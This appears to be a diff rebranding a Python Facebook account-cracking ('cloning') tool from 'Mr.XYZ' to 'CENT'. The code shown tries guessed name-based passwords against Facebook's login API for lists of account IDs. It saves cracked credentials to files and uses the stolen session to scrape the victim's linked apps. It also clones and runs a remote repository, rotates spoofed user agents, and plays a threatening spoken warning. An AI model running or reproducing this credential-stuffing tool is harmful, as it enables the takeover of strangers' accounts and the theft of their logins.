@@ -62,36 +62,36 @@ ua = []
 
 del ua
 """
-Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]
-"""
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82
 
 ua=[]
 
 ##Logo##
-P = '\x1b[1;97m'
-G='\x1b[1;92m'
-R='\x1b[1;91m'
-S ='\x1b[1;96m'
-Y ='\x1b[1;93m'
-uu ='\x1b[1;95m'
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m'
+Y = '\033[93;1m'
+B = '\033[94;1m'
+P = '\033[95;1m'
+C = '\033[96;1m'
 tred = speed
 
-	
+os.system('espeak -a 100 " WELCOME TO CENT TOOL FOR HACKING DONT BYPASS YOR FILE WILL BE GONE"')
+
 logo= f'''
-{G}███╗   ███╗██████╗    ██╗  ██╗██╗   ██╗███████╗
-{R}████╗ ████║██╔══██╗   ╚██╗██╔╝╚██╗ ██╔╝╚══███╔╝
-{Y}██╔████╔██║██████╔╝    ╚███╔╝  ╚████╔╝   ███╔╝ 
-{S}██║╚██╔╝██║██╔══██╗    ██╔██╗   ╚██╔╝   ███╔╝  
-{G}██║ ╚═╝ ██║██║  ██║██╗██╔╝ ██╗   ██║   ███████╗
-{R}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
-\033[1;93m==================================================
-\033[1;97m Owner : Mr.Biju 4.0
-\033[1;97m Facebook : Mr.BiJu
-\033[1;97m Github : Bijoy Chowdhury
-\033[1;97m Status : Free/Local
-\033[1;97m Version:\033[1;92m 3.0 \033[1;97m
-\033[1;97m Notice : Use 10007/10006 For More OK IDz
-\033[1;93m==================================================
+{W}█████████  █████████  ███    ██  ███████████
+{W}██         ██         ██ █   ██      ███    
+{W}██         ████████   ██  █  ██      ███    
+{W}██         ██         ██   █ ██      ███    
+{W}█████████  █████████  ██    ███      ███    
+\033[1;93m===========================================================================================
+\033[1;97m Owner : CENT                                                                             
+\033[1;97m Facebook : CenT
+\033[1;97m Github : https://github.com/CenTsuPH
+\033[1;97m Status : TEST
+\033[1;97m Version:\033[1;92m 0.1 \033[1;97m
+\033[1;97m Notice : DONT TRY BYPASS YOUR DATABASE ON YOUR PHONE WILL be RESET 
+\033[1;93m===========================================================================================
 '''
 
 ####@-----Menu-----@####
@@ -99,7 +99,7 @@ def Hxw_Main():
     os.system("clear")
     print(logo)
     print(f"{oo(1)}File Cloning")
-    print(f"{oo(2)}Pak Random Cloning")
+    print(f"{oo(2)}Random Cloning")
     print(f"{oo(3)}Gmail Cloning")  
     print(f"{oo(4)}Create File")
     print(f"{oo(0)}Exit")
@@ -111,7 +111,7 @@ def Hxw_Main():
         gmail()
     if inpp == "4":
      print(f'{oo("+")}Loading Best File Create Command ')
-     os.system('cd && git clone --depth=1 https://github.com/Mr.XYZ-404/FILE')
+     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
      os.system('cd && cd FILE ;python FILE.py')
      exit()
     if inpp == "0":
@@ -150,7 +150,7 @@ def check(session,coki):
     	pass
     else:
         for gm in game:
-            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=Mr.XYZ-33'))
+            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=-33'))
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
@@ -213,26 +213,26 @@ def pak():
 
 ####@-----UserAgent----@####
 """
-Mozilla/5.0 (Linux; Android 11; Infinix X695 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
-Mozilla/5.0 (Linux; Android 13; V2169 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
-Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
-Mozilla/5.0 (Linux; Android 11; itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360038809 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v9946691043 t2359546008474051152 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v1293053146466352222 t4418554050904986715 ath1fb31b7a altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8702605039731550882 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0
 Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
-Mozilla/5.0 (Linux; Android 12; 22041219C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
-Mozilla/5.0 (Linux; Android 12; TECNO KH6 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.2.0.20.404;]
-Mozilla/5.0 (Linux; Android 11; MP02 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
-Mozilla/5.0 (Linux; Android 12; CPH2457 Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
-Mozilla/5.0 (Linux; Android 11; T781SPP Build/RKQ1.210614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
-Mozilla/5.0 (Linux; Android 10; Z555 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/388.0.0.23.106;]
-Mozilla/5.0 (Linux; Android 8.0.0; CUBOT_P20 Build/O00623; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
-Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]
-Mozilla/5.0 (Linux; Android 10; EVE-LX9N Build/HUAWEIEVE-LX9N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/370.0.0.14.108;]
-Mozilla/5.0 (Linux; Android 12; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
-Mozilla/5.0 (Linux; Android 11; Armor 12 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
-Mozilla/5.0 (Linux; Android 12; 22041216C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
-Mozilla/5.0 (Linux; Android 10; CDY-NX9B Build/HUAWEICDY-N29B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.0.0.0.302;]
-Mozilla/5.0 (Linux; Android 10; STS570 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/389.1.0.23.214;]
-Mozilla/5.0 (Linux; Android 11; TECNO KG6p Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5436392744083573770 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4545621359653455873 t7257912775283346076 ath5ee645e0 altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2894625283128232269 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5494699589149184143 t7257912775283346076 ath5ee645e0 altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360166407 t3176537711211975202 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360166405 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v5410955731649432201 t8056460500199558789 ath5ee645e0 altpriv cvcv=2 smf=0
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v8223426225533733795 t331183210298792754 ath1fb31b7a altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v9947176573 t2359546008474051152 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360178946 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5291232599499729713 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3317947955324566861 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4000966587464841291 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0; E5533) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36
 
 """
 ####@-----FileM-----@####
@@ -267,7 +267,7 @@ def method():
     print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait As You Can :)")
-    print(f"{oo('•')}/sdcard/sexy-4G.txt")
+    print(f"{oo('•')}/sdcard/CENT.txt")
     print('\033[1;93m='*25)
     print()
     
@@ -283,7 +283,7 @@ def method():
         except:
            last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mCENT-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
             heads = None
@@ -295,8 +295,8 @@ def method():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mMr.XYZ-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/Mr.XYZ-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/CENT-OK.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -309,9 +309,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mMr.XYZ-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/Mr.XYZ-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/CENT-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -333,7 +333,7 @@ def method():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mCENT-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
             heads = None
@@ -344,8 +344,8 @@ def method():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mMr.XYZ-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/Mr.XYZ-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/CENT-OK.txt','a').write(f'{acc} • {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -361,9 +361,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mMr.XYZ-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                     print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/Mr.XYZ-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/CENT-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -396,7 +396,7 @@ def andom():
         totalpass.append('first')
         totalpass.append('last')
         if tpp.isnumeric():
-            ex = 'firstlast first123 last123'
+            ex = 'firstlast first123 last123 first last first last123'
             print(f'{oo("+")}{ex} (ETC)')
             for x in range(int(tpp)):
                 totalpass.append(input(f'{oo(x+1)}Password : '))
@@ -415,7 +415,7 @@ def andom():
     print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait As You Can :)")
-    print(f"{oo('•')}/sdcard/Mr.XYZ-OK.txt")
+    print(f"{oo('•')}/sdcard/CENT-OK.txt")
     print('\033[1;93m='*25)
     print()    
     def start(user):
@@ -442,7 +442,7 @@ def andom():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mMr.XYZ-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                 open('/sdcard/Mr.XYZ-OK.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
                     try:
@@ -456,9 +456,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mMr.XYZ-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/Mr.XYZMr.XYZ-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/CENT-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -481,7 +481,7 @@ def andom():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mCENT-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
             heads = None
@@ -492,8 +492,8 @@ def andom():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mMr.XYZ-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/Mr.XYZ.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/CENT.txt','a').write(f'{acc} • {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -509,9 +509,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mMr.XYZ-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                     print('\r\033[1;91m[\033[1;97mCENT-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/Mr.XYZ-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/CENT-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
